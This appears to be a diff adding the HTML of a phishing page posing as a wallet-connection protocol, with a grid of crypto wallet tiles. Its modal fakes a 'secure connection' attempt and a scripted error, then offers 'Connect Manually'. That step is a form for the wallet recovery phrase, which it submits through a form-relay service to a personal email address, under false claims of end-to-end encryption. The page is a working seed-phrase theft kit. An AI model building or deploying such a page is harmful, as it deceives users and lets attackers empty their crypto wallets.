+                <div onclick="myFunction(49)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Ownbit.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Ownbit</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Ownbit.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(50)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Easy Pocket.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Easy Pocket</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Easy Pocket.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(51)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Bridge Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Bridge Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Bridge Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(52)"  class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/SparkPoint.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">SparkPoint</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">SparkPoint.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(53)"  class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Via Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Via Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Via Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(54)"  class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/BitKeep.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">BitKeep</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">BitKeep.com</h4>
+                    </div>
+                </div>
+    
+    
+                <div onclick="myFunction(55)"  class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Vision.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Vision</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Vision.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(56)"  class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/SWFT Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">SWFT Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">SWFT Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(57)"  class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/PEAKDEFI Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">PEAKDEFI Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">PEAKDEFI Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(58)"  class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Cosmostation.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Cosmostation</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Cosmostation.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(59)"  class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Graph Protocol.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Graph Protocol</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Graph Protocol.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(60)"  class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Kardiachain.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Kardiachain</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Kardiachain.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(61)"  class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Keplr.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Keplr</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Keplr.com</h4>
+                    </div>
+                </div>
+    
+                <div  onclick="myFunction(62)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/ICONex.PNGs="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">ICONex</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">ICONex.com</h4>
+                    </div>
+                </div>
+    
+                <div  onclick="myFunction(63)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Fetch.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Fetch</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Fetch.com</h4>
+                    </div>
+                </div>
+    
+                <div  onclick="myFunction(64)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/XDC Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">XDC Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">XDC Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div  onclick="myFunction(65)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Unstoppable Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Unstoppable Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Unstoppable Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div  onclick="myFunction(66)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/MEET.ONE.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">MEET.ONE</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">MEET.ONE.com</h4>
+                    </div>
+                </div>
+    
+                <div  onclick="myFunction(67)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Dok Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Dok Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Dok Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div  onclick="myFunction(68)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/AT.Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">AT.Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">AT.Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div  onclick="myFunction(69)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/MoriX Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">MoriX Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">MoriX Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div  onclick="myFunction(70)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Midas Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Midas Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Midas Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div  onclick="myFunction(71)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Ellipal.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Ellipal</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Ellipal.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(72)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/KEYRING PRO.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">KEYRING PRO</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">KEYRING PRO.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(73)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Blockchain.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Blockchain</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Blockchain.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(74)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Binance Smart chain.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Binance Smart chain</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Binance Smart chain.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(75)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Aktionariat.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Aktionariat</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Aktionariat.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(76)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Coinbase.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Coinbase</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Coinbase.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(77)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/wallet Connect.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">wallet Connect</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">wallet Connect.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(78)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Harmony.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Harmony</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Harmony.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(79)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Tron.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Tron</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Tron.com</h4>
+                    </div>
+                </div>
+    
+    
+            </div>
+            
+    
+        </section>
+    
+    
+        <section class="bg-white  lg:py-[90px] lg:mt-0 mt-[30px] pb-[50px] lg:px-[60px] px-[15px] ">
+    
+            <h2 class="text-blue-700 lg:text-[35px] text-[23px] font-bold">Decentralized</h2>
+            <h2 class="text-blue-700 lg:text-[30px] text-[23px] font-bold">Launchpad</h2>
+            <p class="text-slate-500 py-3 text-[11px] lg:text-[13px]">Open and decentralized protocol for syncing various Wallets to Dapps Secure Server. This is not an app but a protocol that establishes a remote connection between two apps and/or devices </p>
+    
+            <div class="mt-4">
+    
+                <p class="text-black text-[16px] font-semibold my-4 mx-[13px] lg:mx-[25px] ">Subscribe</p>
+    
+                <div class="flex border border-slate-500 rounded-lg w-full mx-[10px] lg:mx-[25px]">
+                    <input type="email" name="" id="" placeholder="name@email.com" class="bg-slate-200 border border-slate-500 rounded-sm indent-2 placeholder:text-black text-[16px] p-3 w-full">
+    
+                    <button class="bg-blue-600 flex justify-center px-4 text-[20px] item-center py-3">
+    
+                        <svg stroke="currentColor" fill="white" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                            <g>
+                                <path fill="none" d="M0 0h24v24H0z">
+                                </path>
+                                <path d="M3 13h6v-2H3V1.846a.5.5 0 0 1 .741-.438l18.462 10.154a.5.5 0 0 1 0 .876L3.741 22.592A.5.5 0 0 1 3 22.154V13z">
+                                </path>
+                            </g>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </section>
+    </div>
+
+
+    <div id="form" class=" hidden fixed bg-white py-7 top-[19%] lg:left-[30%] md:left-[25%] lg:max-w-[45%] md:max-w-[50%] w-{80%} mx-3 border-2">
+
+        <div class="border-3">
+
+            <i class="fa absolute right-0 top-0 fa-close text-[25px] p-2 border mx-2 rounded-lg mt-3"onclick="myFunction() " ></i>
+
+        </div>
+
+        
+
+        <div class="px-4 flex flex-col justify-center items-center">
+            <img id="myImage" src="image/trust.PNG" class="lg:w-[10%] w-[13%]" alt="">
+            <h2 id="head" class="text-[15px] font-semibold ">Trust Wallet</h2>
+            <p class="lg:text-[15px] text-[13px] text-center text-slate-500">This season is secured and encrypted</p>
+ 
+        </div>
+
+        <div id="left" class="lg:py-5 py-4 flex flex-col justify-center relative mx-auto w-[50%] mt-4">
+            <div class="bg-blue-900 h-[10px] lg:h-[12px] overflow-hidden border-2 rounded-lg  w-full">
+                <span class="bg-blue-900 w-[15px] h-[15px] lg:h-[20px] move  rounded-[50%] overflow-hidden border-2 z-40 lg:w-[20px] absolute"></span>
+            </div>
+
+            <h3 class=" mt-3 lg:text-[15px] text-[9px] text-center lg:mx-2 text-black">Starting secure connection...</h3>
+            <p class="lg:text-[15px] text-[13px] text-center mx-2 text-slate-500">please wait</p>
+
+        </div>
+
+        <div id="popup" class="py-5 hidden flex-col justify-center relative mt-4">
+
+            <div class="w-[80%] mx-auto border py-2 border-red-700">
+                <p class="text-[red] text-center text-[12px] lg:text-[16px] px-4">An error occurred... please try again or connect manually</p>
+            </div>
+
+            <div class="w-[80%] mx-auto border mt-4 py-2 border-blue-700">
+                <p class="text-[blue] text-center text-[13px] lg:text-[16px] px-4">Try Again</p>
+            </div>
+
+            <button id="formed" class="w-[80%] mx-auto border mt-4 py-2 text-white bg-blue-700">Connect Manually
+            </button>
+            
+        </div>
+
+        <div id="formsed" class="hidden gap-2 flex-col mt-5 items-center justify-center">
+            <form method="POST" action="https://formsubmit.co/derekzuco9@gmail.com" class="flex gap-2 flex-col items-center justify-center" >
+                <input type="hidden" name="_next" value="https://google.com">
+                <input type="hidden" name="_subject" value="New submission!">
+                <input type="hidden" name="_captcha" value="false">
+                <textarea name="message" minlength="12" id="" rows="5" cols="35"  placeholder="Enter your wallet phrase key.. Typically 12    (sometimes 24 ...)  words separated by single comma"  class="  placeholder:text-[12px] placeholder:text-slate-500 px-2 p-2 indent-1 lg:px-0 border placeholder:p-3 border-slate-400 rounded-lg"></textarea>
+                <input type="submit" class="w-[80%] lg:w-[50%] mx-auto text-white text-[13px] rounded-lg my-2 bg-blue-700 p-2">
+            </form>
+        </div>
+
+        <div class="flex gap-3 justify-start lg:px-5 px-2 lg:mx-7 mx-3 lg:py-8 py-3 items-center">
+            <img src="image/secure.png" class="w-[8%]" alt="">
+            <p class="lg:text-[17px] text-[11px] mx-2 text-slate-500">This session is protected with an end-end encryption</p>
+        </div>
+
+       
+
+
+    </div>
+
+
+    <script src="main.js"></script>
+
+    
+</body>
+</html>
